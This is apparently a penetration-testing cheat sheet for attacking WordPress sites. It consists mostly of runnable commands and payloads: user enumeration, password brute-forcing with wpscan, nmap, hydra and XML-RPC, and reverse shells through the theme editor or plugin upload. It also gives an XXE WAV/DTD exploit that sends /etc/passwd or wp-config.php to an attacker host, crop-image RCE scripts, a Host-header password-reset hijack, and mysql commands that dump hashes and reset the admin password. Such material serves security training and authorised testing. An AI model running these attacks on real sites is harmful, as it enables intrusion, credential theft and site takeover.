# Wordpress

## Theory

WordPress is a popular content management system.

## Practice

### Tools

{% tabs %}
{% tab title="WpScan" %}
[**Wpscan**](https://github.com/wpscanteam/wpscan) is a WordPress security scanner which can enumerate version, themes, plugins and brute-force credentials.

```bash
#Enumerate plugins,themes,Timthumbs,config backups,DB exports,users,media and search for vulnerabilities using a free API token (up 50 searchs)
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.vuln.com [--plugins-detection aggressive] [--detection-mode aggressive] [--api-token <API_TOKEN>]

#Specify username and brute-force (it use XML-RPC if available)
#--password-attack xml-rpc will use XML-RPC to brute-force
wpscan --rua --url http://www.vuln.com -U username --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt [--password-attack xml-rpc]
```
{% endtab %}

{% tab title="Nmap" %}
We can use nmap scripting engine to enumerate and brute-force Wordpress

```bash
#Brute-force passwords on /wp-login.php 
nmap --script http-wordpress-brute <target-ip>

#Enumerate plugins or themes
nmap --script http-wordpress-enum --script-args type="plugins",search-limit=1500 -p 80 <target-ip>

#Enumerates usernames  by exploiting an information disclosure vulnerability existing in versions 2.6, 3.1, 3.1.1, 3.1.3 and 3.2-beta2 and possibly others.
nmap --script http-wordpress-users -p 80 <target-ip>

#Perform all wordpress scans
nmap --script http-wordpress-* -p 80 <target-ip>
```
{% endtab %}
{% endtabs %}

### Enumerate Wordpress Version

{% tabs %}
{% tab title="HTML" %}
There is the meta tag for WordPress in the head tag of the HTML source code.

```xml
<meta name="generator" content="WordPress x.x.x" />
```

We can use following commands and enumerate wordpress version

```bash
curl https://victim.com/ | grep 'content="WordPress'
```
{% endtab %}

{% tab title="Common Files" %}
Check if you can find and read following files

```
/license.txt
/readme.html
```
{% endtab %}

{% tab title="Others" %}
Wordpress version can be found in css links, meta name tag, JavaScript files. We can use following command to extract it

```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
{% endtab %}
{% endtabs %}

### Enumerate Users

{% tabs %}
{% tab title="Manually" %}
**ID Brute**

You get valid users from a WordPress site by Brute Forcing users IDs:

```bash
curl -s -I -X GET http://blog.example.com/?author=1
```

**wp-json**

You can also try to get information about the users by querying:

```bash
curl http://blog.example.com/wp-json/wp/v2/users
```

{% hint style="info" %}
**Only information about the users that has this feature enable will be provided**.

Also note that **/wp-json/wp/v2/pages** could leak IP addresses.
{% endhint %}

#### Login username enumeration

When login in `/wp-login.php` **the message is different** if the indicated username exists or not.
{% endtab %}

{% tab title="Tools" %}
we can list the users using the tools listed above:

```bash
#Nmap enum users from uid 1 to 50
nmap --script http-wordpress-users --script-args basepath="/wordpress/path",limit=50 -p 80 <target-ip>

#WpScan enum users from uid 1 to 20
wpscan --rua -e u1-20 --url http://www.vuln.com/wordpress/
```
{% endtab %}
{% endtabs %}

### Brute-force Passwords

{% hint style="info" %}
You may want to try the default password: **admin:password**
{% endhint %}

{% tabs %}
{% tab title="XML-RPC" %}
If `xml-rpc.php` is active you can perform a credentials brute-force or use it to launch DoS attacks to other resources. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).&#x20;

#### Check

To check whether you have access, send the following request. If it returns methods, it is enabled:

```http
POST /xmlrpc.php HTTP/1.1
Host: vulnerable.com
[...]

<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>
```

Also, we can use [**PostBin**](https://www.toptal.com/developers/postbin/) to confirm the results.

```http
POST /xmlrpc.php HTTP/1.1
Host: vulnerable.com
[...]

<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>https://www.toptal.com/developers/postbin/xxxxxxxxxxxxx-xxxxxxxxxxxxx</string></value></param>
<param><value><string>http://vulnerable.com</string></value></param>
</params>
</methodCall>
```

#### **Brute-force**

**`wp.getUserBlogs`**, **`wp.getCategories`** or **`metaWeblog.getUsersBlogs`** are some of the methods that can be used to brute-force credentials. If you can find any of them you can send something like:

```http
POST /xmlrpc.php HTTP/1.1
Host: vulnerable.com
[...]

<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params>
<param><value>{username}</value></param>
<param><value>{password}</value></param>
</params> 
</methodCall>
```
{% endtab %}

{% tab title="Tools" %}
We can brute-force password using the tools listed above and Hydra:

```bash
#Nmap
nmap --script http-wordpress-brute --script-args uri="/wordpress/path" <target-ip>

#WpScan
wpscan --rua --url http://www.vuln.com -U username --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt [--password-attack xml-rpc]

#Hydra
hydra -L lists/usrname.txt -P lists/pass.txt localhost -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```
{% endtab %}
{% endtabs %}

### Reverse Shell

If we have **access to a privileged Wordpress account**. We can try to execute PHP code from the admin dashboard to get a reverse shell.

{% tabs %}
{% tab title="Themes Injection" %}
It may be possible to edit PHP from the theme used. For this;

* Access to dashboard (/wp-admin/).
* Move to "Appearance" and select theme e.g. "Twenty Seventeen".
* Click "Theme Editor" or "Editor" in the "Appearance" section.
* In the theme editor, click "404 Template (404.php)" on the right.
* Copy and paste the [Unix Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) or the  [Windows one](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php\_reverse\_shell.php).&#x20;
* Access "https://vulnerable.com/wp-content/themes/twentyseventeen/404.php".\
  We should get the target shell in the netcat listener.
{% endtab %}

{% tab title="Malicious Plugin " %}
It may be possible to upload .php files as a plugin. For this:

* Access to dashboard (/wp-admin/).
* Go to Plugins → Plugin Editor.
* Upload the [Unix Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) or the [Windows one](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php\_reverse\_shell.php).
* Access "https://example.com/wp-content/plugins/\<plugin>/\<plugin>.php"\
  We should get the target shell in the netcat listener.
{% endtab %}
{% endtabs %}

### Vulnerabilities

#### Unauthenticated View Private/Draft Posts - CVE-2019-17671

{% tabs %}
{% tab title="Exploit" %}
This vulnerability could allow an unauthenticated user to view private or draft posts due to an issue within WP\_Query.

{% hint style="info" %}
Versions of WordPress <= 5.2.3 are vulnerable
{% endhint %}

```bash
#Just append ?static=1 to the url
http://wordpress.local/?static=1
http://wordpress.local/?static=1&order=asc
```
{% endtab %}
{% endtabs %}

#### Authenticated  XXE (CVE-2021-29447)

{% tabs %}
{% tab title="Exploit" %}
If you have user credential and you have **Author's permissions**, you may exploit this XEE that lead to an **arbitrary file disclosure**.

{% hint style="info" %}
Versions of WordPress 5.6-5.7 are vulnerable
{% endhint %}

First off, create **"exploit.wav"**. (change your ip)

```bash
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://<ATTACKING_IP>:9001/exploit.dtd'"'"'>%remote;%init;%trick;] >\x00'> exploit.wav
```

Next create **"exploit.dtd"**. (change the resource var to the wanted file)

```xml
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
<!-- <!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=../wp-config.php"> -->
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://<ATTACKING_IP>:9001/?p=%file;'>">
```

Then we can start the PHP server on the attacking machine

```bash
php -S 0.0.0.0:9001
```

Now, In target website, login as normal user and go to "Media", click "Add New". Upload the "exploit.wav". After that, open the WAV file. You should see the base64 information revealed in your console.

To decode the Base64, create **“decode.php”** as following.

```php
<?php echo zlib_decode(base64_decode('<Base64_Here>')); ?>
```

Execute the script to decode it

```bash
php decode.php
```
{% endtab %}
{% endtabs %}

#### Crop-image Shell Upload - CVE-2019-8942, CVE-2019-8943

{% tabs %}
{% tab title="Exploit" %}
The Crop-image Shell Upload exploit take advantage of a path traversal and a local file inclusion vulnerability on WordPress. The `crop-image` function allows a user, with at least **author privileges**, to resize an image and perform a path traversal by changing the `_wp_attached_file` reference during the upload. The second part of the exploit will include this image in the current theme by changing the `_wp_page_template` attribute when creating a post.

{% hint style="info" %}
Versions of WordPress 5.0.0 and <= 4.9.8 are vulnerable
{% endhint %}

We can use [v0lck3r's exploit](https://github.com/v0lck3r/CVE-2019-8943) to perform the attack:

```bash
#Auto exploit
python3 RCE_wordpress.py <WP_URL> <USER> <PASSWORD> <THEME_NAME>
```

Or we may use [this exploit](https://github.com/hadrian3689/wordpress\_cropimage)

```bash
#Auto exploit
python3 wp_rce.py -t <WP_URL> -u <USER> -p <PASSWORD> -m <THEME_NAME>
```
{% endtab %}

{% tab title="Metasploit" %}
You can use exploit/multi/http/wp\_crop\_rce this way:

```
msf > use exploit/multi/http/wp_crop_rce
msf exploit(wp_crop_rce) > show targets
    ...targets...
msf exploit(wp_crop_rce) > set TARGET < target-id >
msf exploit(wp_crop_rce) > show options
    ...show and set options...
msf exploit(wp_crop_rce) > exploit
```
{% endtab %}
{% endtabs %}

#### Unauthorized Password Reset - CVE-2017-8295

{% tabs %}
{% tab title="Exploit" %}
If an attacker sends a request similar to the one below to a default Wordpress installation that is accessible by the IP address (IP-based vhost):

```http
POST /wp/wordpress/wp-login.php?action=lostpassword HTTP/1.1
Host: injected-attackers-mxserver.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

user_login=admin&redirect_to=&wp-submit=Get+New+Password
```

Wordpress will trigger the password reset function for the admin user account. Because of the modified HOST header, the SERVER\_NAME will be set to the hostname of attacker's choice. As a result, **Wordpress will pass the reset password email to the attacking domain**.
{% endtab %}
{% endtabs %}

#### SSRF

{% tabs %}
{% tab title="Oembed" %}
Try to access following url and the Worpress site may make a request to you.

```
/wp-json/oembed/1.0/proxy?url=http://10.0.0.1/
```

We can use [this tool](https://github.com/incogbyte/quickpress). It checks if the **methodName: pingback.ping** and for the path **/wp-json/oembed/1.0/proxy** and if exists, it tries to exploit them.

```bash
quickpress -target https://target.com -server http://burpcollaborator.net
```
{% endtab %}
{% endtabs %}

### Post-Exploitation

{% tabs %}
{% tab title="wp-config.php" %}
The `wp-config.php` file contains information required by WordPress to connect to the database such as the database name, database host, username and password, authentication keys and salts, and the database table prefix. This configuration file can also be used to activate DEBUG mode, which can useful in troubleshooting.

With database credentials we can dump username and password and change admin password e.g. with mysql:

```bash
#Extract usernames and passwords:
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"

#Change admin password:
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
{% endtab %}
{% endtabs %}



## Resources

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress" %}

{% embed url="https://exploit-notes.hdks.org/exploit/web/cms/wordpress-pentesting/" %}

